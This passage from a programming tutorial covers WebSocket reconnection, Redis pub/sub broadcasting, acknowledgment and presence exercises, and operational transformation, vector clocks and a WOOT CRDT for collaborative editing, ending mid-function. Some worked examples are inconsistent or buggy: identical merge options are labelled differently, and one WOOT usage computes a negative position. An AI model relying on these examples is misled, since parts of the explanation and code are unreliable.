    this.subscriptions = new Set();
  }

  queueMessage(type, data) {
    /**
     * Queue message while disconnected.
     * Send when reconnected.
     */
    if (this.messageQueue.length >= this.maxQueueSize) {
      this.messageQueue.shift(); // Remove oldest
    }

    this.messageQueue.push({ type, data });
  }

  async onReconnect() {
    /**
     * Called when connection restored.
     * Restore state and send queued messages.
     */
    // Re-subscribe to channels
    for (const channel of this.subscriptions) {
      this.wsClient.send("subscribe", { channel });
    }

    // Send queued messages
    while (this.messageQueue.length > 0) {
      const message = this.messageQueue.shift();
      this.wsClient.send(message.type, message.data);

      // Rate limit to avoid flooding
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
  }

  subscribe(channel) {
    this.subscriptions.add(channel);
    this.wsClient.send("subscribe", { channel });
  }

  send(type, data) {
    if (this.wsClient.connected) {
      this.wsClient.send(type, data);
    } else {
      this.queueMessage(type, data);
    }
  }
}

// Usage:
const ws = new WebSocketClient("ws://localhost:8000/ws");
const reconnection = new ReconnectionManager(ws);

ws.on("open", () => {
  reconnection.onReconnect();
});

// Always use reconnection manager to send
reconnection.send("checkout_file", { filename: "test.mcam" });
```

---

### **Part 8: Scalability - Horizontal Scaling with Redis**

**The Problem:**

```
With multiple servers, WebSocket connections are split:

Server 1:          Server 2:
User A ←─────┐    User C ←─────┐
User B ←─────┤    User D ←─────┤
             │                 │
         Load Balancer
             │
         User sends message

Problem: User A on Server 1 sends message.
         How does User C on Server 2 receive it?

Solution: Message broker (Redis Pub/Sub)
```

**Redis Pub/Sub for Broadcasting:**

```python
import redis.asyncio as redis
import json

class RedisConnectionManager(ConnectionManager):
    """
    Connection manager with Redis pub/sub for multi-server broadcasting.
    """

    def __init__(self, redis_url: str = "redis://localhost"):
        super().__init__()
        self.redis_url = redis_url
        self.redis = None
        self.pubsub = None

    async def connect_redis(self):
        """Connect to Redis and start subscriber."""
        self.redis = await redis.from_url(self.redis_url)
        self.pubsub = self.redis.pubsub()

        # Subscribe to broadcast channel
        await self.pubsub.subscribe('websocket_broadcast')

        # Start listener task
        asyncio.create_task(self._redis_listener())

    async def _redis_listener(self):
        """
        Listen for messages from Redis and broadcast to local connections.
        """
        async for message in self.pubsub.listen():
            if message['type'] == 'message':
                try:
                    data = json.loads(message['data'])
                    # Broadcast to local connections only
                    await self._broadcast_local(data)
                except Exception as e:
                    print(f"Error processing Redis message: {e}")

    async def _broadcast_local(self, message: dict):
        """Broadcast to connections on this server only."""
        tasks = [
            self._send_safe(conn, message)
            for conn in self.active_connections
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def broadcast(self, message: dict):
        """
        Broadcast to ALL servers via Redis.

        Flow:
        1. Publish to Redis
        2. All servers (including this one) receive from Redis
        3. Each server broadcasts to its local connections
        """
        await self.redis.publish(
            'websocket_broadcast',
            json.dumps(message)
        )

    async def disconnect_redis(self):
        """Cleanup Redis connections."""
        if self.pubsub:
            await self.pubsub.unsubscribe('websocket_broadcast')
            await self.pubsub.close()

        if self.redis:
            await self.redis.close()

# Usage:
manager = RedisConnectionManager()

@app.on_event("startup")
async def startup():
    await manager.connect_redis()

@app.on_event("shutdown")
async def shutdown():
    await manager.disconnect_redis()

# Now broadcasts work across all servers
await manager.broadcast({
    'type': 'file_updated',
    'data': {'filename': 'test.mcam'}
})
# All connected users receive message, regardless of which server they're on
```

**Architecture Diagram:**

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  Server 1   │    │  Server 2   │    │  Server 3   │
│             │    │             │    │             │
│ User A ←────┤    │ User C ←────┤    │ User E ←────┤
│ User B ←────┤    │ User D ←────┤    │ User F ←────┤
│             │    │             │    │             │
└──────┬──────┘    └──────┬──────┘    └──────┬──────┘
       │                  │                  │
       └──────────────────┼──────────────────┘
                          │
                    ┌─────▼─────┐
                    │   Redis   │
                    │  Pub/Sub  │
                    └───────────┘

User A sends message:
1. Server 1 receives message
2. Server 1 publishes to Redis
3. Redis broadcasts to all servers (including Server 1)
4. Each server broadcasts to its local connections
5. All users (A, B, C, D, E, F) receive message
```

---

### **Practice Exercise 1: Implement Message Acknowledgment**

```python
class AcknowledgmentManager:
    """
    Track messages waiting for acknowledgment.

    Pattern: Reliable delivery with timeouts

    Protocol:
    1. Send message with unique ID
    2. Wait for ACK from client
    3. If no ACK within timeout, resend
    4. Give up after max retries
    """

    def __init__(self, max_retries: int = 3, timeout_seconds: int = 5):
        self.pending = {}  # message_id → (message, retries, sent_time)
        self.max_retries = max_retries
        self.timeout_seconds = timeout_seconds

    async def send_with_ack(self, connection: WebSocketConnection,
                           message: dict) -> bool:
        """
        Send message and wait for acknowledgment.

        Returns: True if acknowledged, False if failed
        """
        # Your implementation here
        pass

    def acknowledge(self, message_id: str):
        """Mark message as acknowledged."""
        # Your implementation here
        pass

    async def retry_loop(self):
        """Background task that retries unacknowledged messages."""
        # Your implementation here
        pass

# Solution:
import uuid
import asyncio
from datetime import datetime, timedelta

class AcknowledgmentManager:
    def __init__(self, max_retries: int = 3, timeout_seconds: int = 5):
        self.pending = {}
        self.max_retries = max_retries
        self.timeout_seconds = timeout_seconds
        self.ack_events = {}  # message_id → asyncio.Event

    async def send_with_ack(self, connection: WebSocketConnection,
                           message: dict) -> bool:
        # Generate unique message ID
        message_id = str(uuid.uuid4())
        message['id'] = message_id

        # Create event for acknowledgment
        ack_event = asyncio.Event()
        self.ack_events[message_id] = ack_event

        # Track as pending
        self.pending[message_id] = {
            'message': message,
            'connection': connection,
            'retries': 0,
            'sent_time': datetime.utcnow()
        }

        # Send message
        await connection.send_json(message)

        # Wait for acknowledgment (with timeout)
        try:
            await asyncio.wait_for(
                ack_event.wait(),
                timeout=self.timeout_seconds
            )
            return True

        except asyncio.TimeoutError:
            # No acknowledgment - will be retried by retry_loop
            return False

    def acknowledge(self, message_id: str):
        if message_id in self.ack_events:
            # Signal that message was acknowledged
            self.ack_events[message_id].set()

            # Clean up
            del self.pending[message_id]
            del self.ack_events[message_id]

    async def retry_loop(self):
        """Retry unacknowledged messages periodically."""
        while True:
            await asyncio.sleep(1)

            now = datetime.utcnow()
            to_retry = []

            for message_id, info in list(self.pending.items()):
                age = now - info['sent_time']

                if age.total_seconds() > self.timeout_seconds:
                    if info['retries'] < self.max_retries:
                        # Retry
                        to_retry.append((message_id, info))
                    else:
                        # Give up
                        print(f"Message {message_id} failed after {self.max_retries} retries")
                        if message_id in self.ack_events:
                            del self.ack_events[message_id]
                        del self.pending[message_id]

            # Retry messages
            for message_id, info in to_retry:
                info['retries'] += 1
                info['sent_time'] = now

                try:
                    await info['connection'].send_json(info['message'])
                except Exception as e:
                    print(f"Failed to retry message {message_id}: {e}")

# Usage:
ack_manager = AcknowledgmentManager()

# Start retry loop
asyncio.create_task(ack_manager.retry_loop())

# Send important message
success = await ack_manager.send_with_ack(connection, {
    'type': 'critical_update',
    'data': {'value': 123}
})

# Client must acknowledge
@router.handler('ack')
async def handle_ack(connection, data):
    message_id = data.get('message_id')
    ack_manager.acknowledge(message_id)
```

---

### **Practice Exercise 2: Implement Presence System**

```python
class PresenceManager:
    """
    Track which users are online and what they're viewing.

    Features:
    - Track user online status
    - Track current page/file user is viewing
    - Notify others when user status changes
    """

    def __init__(self):
        self.presence = {}  # user_id → presence_info

    async def user_connected(self, user_id: str, connection: WebSocketConnection):
        """User connected."""
        # Your implementation
        pass

    async def user_disconnected(self, user_id: str):
        """User disconnected."""
        # Your implementation
        pass

    async def update_presence(self, user_id: str, status: dict):
        """Update user's presence (what they're viewing, etc.)."""
        # Your implementation
        pass

    def get_online_users(self) -> List[dict]:
        """Get list of online users."""
        # Your implementation
        pass

# Solution:
from datetime import datetime

class PresenceManager:
    def __init__(self, connection_manager: ConnectionManager):
        self.connection_manager = connection_manager
        self.presence = {}

    async def user_connected(self, user_id: str, connection: WebSocketConnection):
        self.presence[user_id] = {
            'user_id': user_id,
            'connection': connection,
            'status': 'online',
            'last_seen': datetime.utcnow(),
            'viewing': None
        }

        # Broadcast to others
        await self.connection_manager.broadcast({
            'type': 'user_online',
            'data': {
                'user_id': user_id,
                'timestamp': datetime.utcnow().isoformat()
            }
        })

    async def user_disconnected(self, user_id: str):
        if user_id in self.presence:
            del self.presence[user_id]

            # Broadcast to others
            await self.connection_manager.broadcast({
                'type': 'user_offline',
                'data': {
                    'user_id': user_id,
                    'timestamp': datetime.utcnow().isoformat()
                }
            })

    async def update_presence(self, user_id: str, status: dict):
        if user_id in self.presence:
            self.presence[user_id].update({
                'viewing': status.get('viewing'),
                'last_seen': datetime.utcnow()
            })

            # Broadcast presence update
            await self.connection_manager.broadcast({
                'type': 'presence_updated',
                'data': {
                    'user_id': user_id,
                    'viewing': status.get('viewing')
                }
            })

    def get_online_users(self) -> List[dict]:
        return [
            {
                'user_id': info['user_id'],
                'status': info['status'],
                'viewing': info['viewing'],
                'last_seen': info['last_seen'].isoformat()
            }
            for info in self.presence.values()
        ]

    def get_viewers(self, filename: str) -> List[str]:
        """Get list of users currently viewing a file."""
        return [
            info['user_id']
            for info in self.presence.values()
            if info.get('viewing') == filename
        ]

# Usage:
presence = PresenceManager(manager)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, user_id: str):
    connection = WebSocketConnection(websocket)
    await manager.connect(connection)
    await presence.user_connected(user_id, connection)

    try:
        while True:
            message = await connection.receive()

            if message['type'] == 'viewing':
                await presence.update_presence(user_id, {
                    'viewing': message['data']['filename']
                })

    finally:
        await presence.user_disconnected(user_id)
        manager.disconnect(connection)
```

---

Ready for Level 18 when you're ready. Next level will cover collaborative editing, operational transformation (OT) / CRDT algorithms, conflict resolution, and real-time synchronization - the algorithms that power Google Docs-style collaboration.

## **Level 18 Enhancement: Collaborative Editing - Operational Transformation & CRDTs**

**Reference:** Your tutorial implements basic collaborative features where multiple users can edit files simultaneously.

**Depth Needed:** Collaborative editing is one of the most complex problems in distributed systems. We need to understand operational transformation (the algorithm behind Google Docs), CRDTs (modern alternative), vector clocks for causality tracking, and conflict resolution strategies. This is where theory meets practice in the most challenging way.

---

### **Part 1: The Collaborative Editing Problem**

**The Fundamental Challenge:**

```
Scenario: Two users editing same document simultaneously

Time    User A (New York)           User B (London)         Document State
─────────────────────────────────────────────────────────────────────────────
t0      "Hello World"               "Hello World"           "Hello World"
t1      Insert "!" at pos 11
        → "Hello World!"            "Hello World"           ???
t2      "Hello World!"              Insert " there" at pos 5
                                    → "Hello there World"   ???

Final states:
User A sees: "Hello World!"
User B sees: "Hello there World"

What should the TRUE final state be?
Option 1: "Hello there World!"  (A's change lost)
Option 2: "Hello World!"        (B's change lost)
Option 3: "Hello there World!!" (nonsense)
Option 4: "Hello there World!"  (correct merge)

The last option requires TRANSFORMATION of operations.
```

**Why Simple Approaches Fail:**

```python
# Approach 1: Last Write Wins (LWW)
# User A: Insert "!" at position 11 (timestamp: t1)
# User B: Insert " there" at position 5 (timestamp: t2)
# Result: Only t2 operation kept (t1 lost)
# Final: "Hello there World" ← User A's work lost!

# Approach 2: Merge by Position
# Apply both operations as-is
# User A: Insert "!" at position 11
# User B: Insert " there" at position 5
# Problem: Position 11 in original is different after B's insert
# Result: "Hello there World!" ← Wrong! Should be at end

# Approach 3: Lock Document
# User A starts editing → lock document
# User B waits until A finishes
# Result: No concurrency, defeats the purpose

# We need: Transform operations to account for concurrent changes
```

---

### **Part 2: Operational Transformation (OT) - The Theory**

**Core Concept:**

```
Operational Transformation: Adjust operations to account for
concurrent operations that happened "in parallel"

Given:
- Operation O1 from User A
- Operation O2 from User B (concurrent with O1)

Compute:
- O1' = transform(O1, O2)  ← O1 adjusted for O2
- O2' = transform(O2, O1)  ← O2 adjusted for O1

Such that:
apply(apply(document, O1), O2') == apply(apply(document, O2), O1')

This is called the "Convergence Property"
```

**The Transformation Function:**

```python
from dataclasses import dataclass
from typing import Literal

@dataclass
class Operation:
    """
    Represents a text editing operation.
    """
    type: Literal['insert', 'delete', 'retain']
    position: int
    content: str = ""  # For insert
    length: int = 0    # For delete/retain

    def __repr__(self):
        if self.type == 'insert':
            return f"Insert('{self.content}' at {self.position})"
        elif self.type == 'delete':
            return f"Delete({self.length} at {self.position})"
        else:
            return f"Retain({self.length} at {self.position})"

def transform(op1: Operation, op2: Operation, priority: str = 'left') -> Operation:
    """
    Transform op1 against op2.

    Returns: op1' (adjusted version of op1)

    Priority: Which operation gets precedence at same position
    - 'left': op1 comes before op2 at same position
    - 'right': op2 comes before op1 at same position

    Time Complexity: O(1) for each transformation
    """
    # Case 1: Both insert at same position
    if op1.type == 'insert' and op2.type == 'insert':
        if op1.position < op2.position:
            # op1 is before op2 - no change needed
            return op1
        elif op1.position > op2.position:
            # op1 is after op2 - shift position
            return Operation(
                type='insert',
                position=op1.position + len(op2.content),
                content=op1.content
            )
        else:
            # Same position - use priority
            if priority == 'left':
                # op1 goes first - no change
                return op1
            else:
                # op2 goes first - shift op1
                return Operation(
                    type='insert',
                    position=op1.position + len(op2.content),
                    content=op1.content
                )

    # Case 2: op1 insert, op2 delete
    elif op1.type == 'insert' and op2.type == 'delete':
        if op1.position <= op2.position:
            # Insert before delete - no change
            return op1
        elif op1.position >= op2.position + op2.length:
            # Insert after delete - shift back
            return Operation(
                type='insert',
                position=op1.position - op2.length,
                content=op1.content
            )
        else:
            # Insert within deleted range - shift to delete start
            return Operation(
                type='insert',
                position=op2.position,
                content=op1.content
            )

    # Case 3: op1 delete, op2 insert
    elif op1.type == 'delete' and op2.type == 'insert':
        if op1.position < op2.position:
            # Delete before insert - no change
            return op1
        elif op1.position >= op2.position:
            # Delete after insert - shift forward
            return Operation(
                type='delete',
                position=op1.position + len(op2.content),
                length=op1.length
            )

    # Case 4: Both delete
    elif op1.type == 'delete' and op2.type == 'delete':
        if op1.position < op2.position:
            # op1 deletes before op2
            if op1.position + op1.length <= op2.position:
                # No overlap
                return op1
            else:
                # Overlap - reduce length
                overlap = (op1.position + op1.length) - op2.position
                return Operation(
                    type='delete',
                    position=op1.position,
                    length=op1.length - overlap
                )
        elif op1.position >= op2.position + op2.length:
            # op1 deletes after op2 - shift back
            return Operation(
                type='delete',
                position=op1.position - op2.length,
                length=op1.length
            )
        else:
            # op1 within op2's delete range - already deleted
            return Operation(
                type='delete',
                position=op2.position,
                length=0  # Nothing to delete
            )

    return op1

# Example usage:
doc = "Hello World"

# User A: Insert "!" at position 11
op_a = Operation('insert', 11, "!")

# User B: Insert " there" at position 5
op_b = Operation('insert', 5, " there")

# Transform A against B
op_a_prime = transform(op_a, op_b, priority='left')
print(op_a_prime)  # Insert('!' at 17)
# Position shifted from 11 to 17 because " there" (6 chars) inserted before

# Apply operations
result_a = apply_operation(doc, op_a)          # "Hello World!"
result_b = apply_operation(doc, op_b)          # "Hello there World"
result_convergent = apply_operation(result_b, op_a_prime)  # "Hello there World!"

# Verify convergence
assert result_convergent == apply_operation(apply_operation(doc, op_b), op_a_prime)
```

**The Convergence Property (Mathematical Proof Sketch):**

```
Theorem: For any two operations O1 and O2,
  apply(apply(S, O1), transform(O2, O1)) = apply(apply(S, O2), transform(O1, O2))

Where S is the initial state.

Proof by cases:

Case 1: Insert-Insert at different positions
  - Transformations shift positions appropriately
  - Order doesn't matter after adjustment

Case 2: Insert-Delete
  - Delete shifts insert positions
  - Insert shifts delete positions
  - Net effect is same

Case 3: Delete-Delete
  - Overlapping deletes reduce each other
  - Non-overlapping deletes commute with position adjustment

The key insight: Transformation compensates for the "happened before"
relationship, making concurrent operations appear sequential.
```

---

### **Part 3: Applying Operations to Text**

**The Apply Function:**

```python
def apply_operation(text: str, op: Operation) -> str:
    """
    Apply operation to text.

    Time Complexity: O(n) where n = len(text)
    (Python strings are immutable, so we create new string)

    Space Complexity: O(n)
    """
    if op.type == 'insert':
        # Insert content at position
        return text[:op.position] + op.content + text[op.position:]

    elif op.type == 'delete':
        # Delete length characters starting at position
        end_pos = op.position + op.length
        return text[:op.position] + text[end_pos:]

    elif op.type == 'retain':
        # No change (used in compressed operation sequences)
        return text

    else:
        raise ValueError(f"Unknown operation type: {op.type}")

# Example:
text = "Hello World"

op1 = Operation('insert', 5, " Beautiful")
text = apply_operation(text, op1)
print(text)  # "Hello Beautiful World"

op2 = Operation('delete', 6, length=9)
text = apply_operation(text, op2)
print(text)  # "Hello  World"

# Note: This creates new strings each time (inefficient for real-time editing)
# Production systems use rope data structures or piece tables
```

---

### **Part 4: Operation Sequences - Compressing Multiple Edits**

**The Problem:**

```python
# User types "Hello" - generates 5 operations:
ops = [
    Operation('insert', 0, 'H'),
    Operation('insert', 1, 'e'),
    Operation('insert', 2, 'l'),
    Operation('insert', 3, 'l'),
    Operation('insert', 4, 'o')
]

# Inefficient to send 5 separate operations!
# Better: Combine into one
combined = Operation('insert', 0, 'Hello')

# But what if user types, then moves cursor, then types more?
# Need to represent multiple non-adjacent operations
```

**Operation Sequence Format:**

```python
from typing import List

@dataclass
class OperationSequence:
    """
    Sequence of operations with positions.

    Compact representation:
    - Retain N: Skip N characters (cursor movement)
    - Insert S: Insert string S
    - Delete N: Delete N characters

    Example: "Hello World" → "Hello Beautiful World"
    [Retain(6), Insert("Beautiful "), Retain(5)]
    """
    operations: List[Operation]

    def apply(self, text: str) -> str:
        """Apply sequence of operations."""
        result = text
        for op in self.operations:
            result = apply_operation(result, op)
        return result

    def to_compact(self) -> List[dict]:
        """
        Convert to compact JSON-friendly format.

        Format: [retain_count, insert_string, delete_count, ...]
        """
        compact = []
        for op in self.operations:
            if op.type == 'retain':
                compact.append(op.length)
            elif op.type == 'insert':
                compact.append(op.content)
            elif op.type == 'delete':
                compact.append(-op.length)  # Negative for delete

        return compact

    @classmethod
    def from_compact(cls, compact: List) -> 'OperationSequence':
        """Parse compact format."""
        operations = []
        position = 0

        for item in compact:
            if isinstance(item, int):
                if item > 0:
                    # Retain
                    operations.append(Operation('retain', position, length=item))
                    position += item
                else:
                    # Delete
                    operations.append(Operation('delete', position, length=-item))
            elif isinstance(item, str):
                # Insert
                operations.append(Operation('insert', position, content=item))
                position += len(item)

        return cls(operations)

# Example:
# Original: "Hello World"
# Change to: "Hello Beautiful World"

seq = OperationSequence([
    Operation('retain', 0, length=6),      # Keep "Hello "
    Operation('insert', 6, "Beautiful "),  # Insert
    Operation('retain', 6, length=5)       # Keep "World"
])

# Compact format:
compact = seq.to_compact()
print(compact)  # [6, "Beautiful ", 5]

# Apply
result = seq.apply("Hello World")
print(result)  # "Hello Beautiful World"
```

---

### **Part 5: Vector Clocks - Tracking Causality**

**The Causality Problem:**

```
Three users edit concurrently:

Site A: Operation O1 at time t1
Site B: Operation O2 at time t2 (concurrent with O1)
Site C: Operation O3 at time t3 (sees O1, but not O2)

Question: In what order should operations be applied?

Can't use wall clock time:
- Clocks may be out of sync
- Network delays vary
- Need logical causality, not physical time

Solution: Vector Clocks
```

**Vector Clock Theory:**

```python
from typing import Dict

class VectorClock:
    """
    Track causality in distributed system.

    Each site maintains vector: [count_siteA, count_siteB, count_siteC, ...]

    Properties:
    - VC1 < VC2: VC1 happened before VC2
    - VC1 || VC2: VC1 and VC2 are concurrent
    - VC1 == VC2: Same logical time

    Example:
    Site A: [1, 0, 0]  ← A's first operation
    Site B: [1, 1, 0]  ← B's first op, after seeing A's op
    Site C: [1, 0, 1]  ← C's first op, after seeing A's op

    B and C are concurrent (neither < the other)
    """

    def __init__(self, site_id: str, num_sites: int = 3):
        self.site_id = site_id
        self.clock: Dict[str, int] = {}

    def increment(self):
        """Increment local counter (before sending operation)."""
        self.clock[self.site_id] = self.clock.get(self.site_id, 0) + 1

    def update(self, other: 'VectorClock'):
        """
        Update with received clock (when receiving operation).

        Algorithm: Take max of each component
        """
        for site_id, count in other.clock.items():
            self.clock[site_id] = max(self.clock.get(site_id, 0), count)

    def happens_before(self, other: 'VectorClock') -> bool:
        """
        Check if self happened before other.

        Definition: VC1 < VC2 iff
        - For all i: VC1[i] <= VC2[i]
        - AND exists j: VC1[j] < VC2[j]

        Time Complexity: O(n) where n = number of sites
        """
        all_less_equal = True
        exists_strictly_less = False

        all_sites = set(self.clock.keys()) | set(other.clock.keys())

        for site_id in all_sites:
            self_count = self.clock.get(site_id, 0)
            other_count = other.clock.get(site_id, 0)

            if self_count > other_count:
                all_less_equal = False
                break

            if self_count < other_count:
                exists_strictly_less = True

        return all_less_equal and exists_strictly_less

    def is_concurrent(self, other: 'VectorClock') -> bool:
        """
        Check if self and other are concurrent.

        Concurrent means: neither happened before the other
        """
        return not self.happens_before(other) and not other.happens_before(self)

    def copy(self) -> 'VectorClock':
        """Create independent copy."""
        new_clock = VectorClock(self.site_id)
        new_clock.clock = self.clock.copy()
        return new_clock

    def __repr__(self):
        return f"VC({self.clock})"

# Example:
# Three sites collaborating
site_a = VectorClock("A")
site_b = VectorClock("B")
site_c = VectorClock("C")

# Site A performs operation
site_a.increment()
print(site_a)  # VC({'A': 1})

# Site A sends to Site B
op_from_a = {'op': 'insert', 'clock': site_a.copy()}

# Site B receives
site_b.update(op_from_a['clock'])
site_b.increment()  # B's own operation
print(site_b)  # VC({'A': 1, 'B': 1})

# Site C performs operation concurrently (hasn't seen B's op)
site_c.update(op_from_a['clock'])
site_c.increment()
print(site_c)  # VC({'A': 1, 'C': 1})

# Check causality
print(site_b.is_concurrent(site_c))  # True - B and C are concurrent
print(site_a.happens_before(site_b))  # True - A happened before B
print(site_a.happens_before(site_c))  # True - A happened before C
```

**Using Vector Clocks with OT:**

```python
@dataclass
class TimestampedOperation:
    """Operation with causal metadata."""
    operation: Operation
    vector_clock: VectorClock
    site_id: str
    sequence_number: int  # Local sequence at site

class OTEngine:
    """
    Operational Transformation engine with causality tracking.
    """

    def __init__(self, site_id: str):
        self.site_id = site_id
        self.vector_clock = VectorClock(site_id)
        self.sequence_number = 0
        self.history = []  # All operations in causal order
        self.pending = []  # Operations waiting for dependencies

    def generate_operation(self, op: Operation) -> TimestampedOperation:
        """
        Create operation from local edit.
        """
        self.sequence_number += 1
        self.vector_clock.increment()

        timestamped_op = TimestampedOperation(
            operation=op,
            vector_clock=self.vector_clock.copy(),
            site_id=self.site_id,
            sequence_number=self.sequence_number
        )

        self.history.append(timestamped_op)
        return timestamped_op

    def receive_operation(self, timestamped_op: TimestampedOperation) -> Operation:
        """
        Receive operation from remote site.

        Returns: Transformed operation ready to apply

        Algorithm:
        1. Check if we've seen all causally-prior operations
        2. If yes: Transform against concurrent ops in history
        3. If no: Buffer in pending queue
        """
        # Update our clock
        self.vector_clock.update(timestamped_op.vector_clock)

        # Check if we can apply (have all dependencies)
        if not self._has_all_dependencies(timestamped_op):
            self.pending.append(timestamped_op)
            return None

        # Transform against concurrent operations
        transformed_op = self._transform_against_history(timestamped_op)

        # Add to history
        self.history.append(timestamped_op)

        # Process pending operations that now have dependencies satisfied
        self._process_pending()

        return transformed_op

    def _has_all_dependencies(self, timestamped_op: TimestampedOperation) -> bool:
        """Check if we've received all operations that causally precede this one."""
        # For each entry in the operation's vector clock,
        # check if our clock is at least that value
        for site_id, count in timestamped_op.vector_clock.clock.items():
            if site_id == timestamped_op.site_id:
                # For the origin site, check we have previous operation
                if self.vector_clock.clock.get(site_id, 0) < count - 1:
                    return False
            else:
                # For other sites, check we're up to date
                if self.vector_clock.clock.get(site_id, 0) < count:
                    return False

        return True

    def _transform_against_history(self, timestamped_op: TimestampedOperation) -> Operation:
        """
        Transform operation against concurrent operations in history.

        Algorithm:
        1. Find all operations in history that are concurrent with incoming op
        2. Transform incoming op against each concurrent op
        3. Return final transformed operation
        """
        op = timestamped_op.operation

        for historical_op in self.history:
            # Skip if this is from same site and earlier
            if historical_op.site_id == timestamped_op.site_id:
                if historical_op.sequence_number < timestamped_op.sequence_number:
                    continue

            # Check if concurrent
            if historical_op.vector_clock.is_concurrent(timestamped_op.vector_clock):
                # Transform against this concurrent operation
                priority = 'left' if historical_op.site_id < timestamped_op.site_id else 'right'
                op = transform(op, historical_op.operation, priority)

        return op

    def _process_pending(self):
        """Process pending operations whose dependencies are now satisfied."""
        processed = []

        for pending_op in self.pending:
            if self._has_all_dependencies(pending_op):
                transformed = self._transform_against_history(pending_op)
                self.history.append(pending_op)
                processed.append(pending_op)

                # Would apply to document here

        # Remove processed from pending
        for op in processed:
            self.pending.remove(op)
```

---

### **Part 6: CRDTs - The Alternative Approach**

**Conflict-free Replicated Data Types:**

```
OT vs CRDT:

Operational Transformation:
+ Efficient (small operations)
+ Works well for text
- Complex transformation logic
- Requires central server or complex 3-way merge
- Hard to get right (many edge cases)

CRDT (Conflict-free Replicated Data Type):
+ Mathematically proven correctness
+ Works in fully P2P networks (no server needed)
+ Simpler to implement
- Larger overhead (more metadata)
- Can accumulate tombstones (deleted items still tracked)

Key difference: CRDT operations commute naturally (no transformation needed)
```

**CRDT for Text: WOOT Algorithm:**

```python
from dataclasses import dataclass
from typing import Optional, List
import uuid

@dataclass
class WChar:
    """
    Character in WOOT (Without Operational Transformation).

    Each character has:
    - id: Unique identifier
    - value: The character itself
    - visible: Is it visible (not deleted)?
    - prev_id: ID of previous character
    - next_id: ID of next character
    """
    id: str
    value: str
    visible: bool
    prev_id: Optional[str]
    next_id: Optional[str]
    site_id: str
    clock: int

class WootString:
    """
    CRDT for collaborative text editing.

    Key insight: Characters have stable IDs that never change.
    Delete just marks character as invisible.
    Insert finds position based on prev/next IDs (not index).

    Convergence property: All sites converge to same string
    regardless of operation order.
    """

    def __init__(self, site_id: str):
        self.site_id = site_id
        self.clock = 0

        # Special boundary characters
        self.chars = [
            WChar('START', '', True, None, 'END', '', 0),
            WChar('END', '', True, 'START', None, '', 0)
        ]

        # Index for fast lookup
        self.char_index = {
            'START': self.chars[0],
            'END': self.chars[1]
        }

    def insert(self, position: int, value: str) -> WChar:
        """
        Insert character at position.

        Returns: WChar operation to send to other sites

        Time Complexity: O(n) to find position
        """
        self.clock += 1

        # Find prev and next characters at position
        visible_chars = [c for c in self.chars if c.visible]
        prev_char = visible_chars[position]
        next_char = visible_chars[position + 1]

        # Create new character
        new_char = WChar(
            id=f"{self.site_id}:{self.clock}",
            value=value,
            visible=True,
            prev_id=prev_char.id,
            next_id=next_char.id,
            site_id=self.site_id,
            clock=self.clock
        )

        # Insert in list
        self._integrate(new_char, prev_char, next_char)

        return new_char

    def delete(self, position: int) -> str:
        """
        Delete character at position.

        Returns: Character ID to send to other sites
        """
        visible_chars = [c for c in self.chars if c.visible]
        char_to_delete = visible_chars[position + 1]  # +1 for START

        char_to_delete.visible = False

        return char_to_delete.id

    def _integrate(self, new_char: WChar, prev_char: WChar, next_char: WChar):
        """
        Integrate character into sequence between prev and next.

        Algorithm:
        1. Find all characters between prev and next
        2. Find correct position based on site_id and clock
        3. Insert at that position

        This ensures convergence even with concurrent inserts at same position.
        """
        # Find subsequence between prev and next
        subseq = []
        for char in self.chars:
            if char.prev_id == prev_char.id and char.next_id == next_char.id:
                subseq.append(char)

        # Find insertion point
        # Sort by (clock, site_id) to break ties consistently
        insert_index = 0
        for i, char in enumerate(subseq):
            if (new_char.clock, new_char.site_id) > (char.clock, char.site_id):
                insert_index = i + 1

        # Insert in main list
        prev_index = self.chars.index(prev_char)
        self.chars.insert(prev_index + 1 + insert_index, new_char)
        self.char_index[new_char.id] = new_char

    def remote_insert(self, char: WChar):
        """Apply insert operation from remote site."""
        if char.id in self.char_index:
            return  # Already have this character

        prev_char = self.char_index.get(char.prev_id)
        next_char = self.char_index.get(char.next_id)

        if prev_char and next_char:
            self._integrate(char, prev_char, next_char)

    def remote_delete(self, char_id: str):
        """Apply delete operation from remote site."""
        char = self.char_index.get(char_id)
        if char:
            char.visible = False

    def to_string(self) -> str:
        """Convert to visible string."""
        return ''.join(c.value for c in self.chars if c.visible)

    def get_visible_position(self, char_id: str) -> int:
        """Get visible position of character."""
        position = 0
        for char in self.chars:
            if char.id == char_id:
                return position
            if char.visible:
                position += 1
        return -1

# Example:
site_a = WootString("A")
site_b = WootString("B")

# Site A: Insert "Hello"
for char in "Hello":
    op = site_a.insert(len(site_a.to_string()) - 2, char)  # -2 for START/END
    site_b.remote_insert(op)

print(site_a.to_string())  # "Hello"
print(site_b.to_string())  # "Hello"

# Concurrent inserts at same position
# Site A: Insert "!" at end
op_a = site_a.insert(5, "!")

# Site B: Insert "?" at end (before seeing A's operation)
op_b = site_b.insert(5, "?")

# Exchange operations
site_a.remote_insert(op_b)
site_b.remote_insert(op_a)

# Both converge to same result
print(site_a.to_string())  # "Hello?!" or "Hello!?" (deterministic based on site_id)
print(site_b.to_string())  # Same as site_a
assert site_a.to_string() == site_b.to_string()  # Convergence!
```

**Why CRDT Converges (Mathematical Proof Sketch):**

```
Theorem: WOOT converges for any set of operations

Proof:
1. Each character has unique, immutable ID
2. Insert places character between prev_id and next_id
3. Position determined by (clock, site_id) - total order
4. Delete only marks invisible, doesn't remove

Key properties:
- Commutativity: insert(A) ; insert(B) ≡ insert(B) ; insert(A)
  (Both produce same final sequence)
- Idempotence: insert(A) ; insert(A) ≡ insert(A)
  (Duplicate detection via ID)
- Monotonicity: Only add characters, never remove
  (Delete is just marking)

Therefore: All sites converge regardless of operation order
```

---

### **Part 7: Complete Collaborative Editor Implementation**

```python
from fastapi import WebSocket
import json
import asyncio

class CollaborativeDocument:
    """
    Collaborative document using OT.
    """

    def __init__(self, doc_id: str):
        self.doc_id = doc_id
        self.content = ""
        self.version = 0
        self.operations = []  # History of all operations
        self.connected_clients = {}  # client_id → connection

    async def apply_operation(self, client_id: str, operation: Operation,
                              client_version: int) -> dict:
        """
        Apply operation from client.

        Returns: Transformed operation to send to client

        Algorithm:
        1. Transform operation against operations since client_version
        2. Apply to document
        3. Broadcast to other clients
        """
        # Transform against operations client hasn't seen
        transformed_op = operation

        for i in range(client_version, len(self.operations)):
            historical_op = self.operations[i]
